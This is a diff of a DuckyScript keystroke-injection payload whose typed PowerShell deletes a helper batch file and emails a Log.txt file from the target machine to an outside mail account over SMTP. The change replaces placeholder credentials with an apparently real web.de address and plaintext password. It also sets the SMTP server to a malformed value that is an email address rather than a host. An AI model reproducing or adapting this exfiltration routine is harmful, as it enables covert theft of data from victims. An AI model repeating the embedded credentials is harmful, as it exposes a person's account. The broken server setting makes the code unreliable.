@@ -58,13 +58,13 @@ ENTER
 STRING del .\filter.bat
 ENTER
 REM Email The Log.txt file
-STRING $SMTPServer = 'smtp-mail.outlook.com'
+STRING $SMTPServer = 'smtp-milanthierfelder@web.de'
 ENTER
 STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSSL = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR EMAIL HERE', 'YOUR EMAIL PASSWORD HERE')
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('milanthierfeldet@web.de', 'Robomaster143')
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
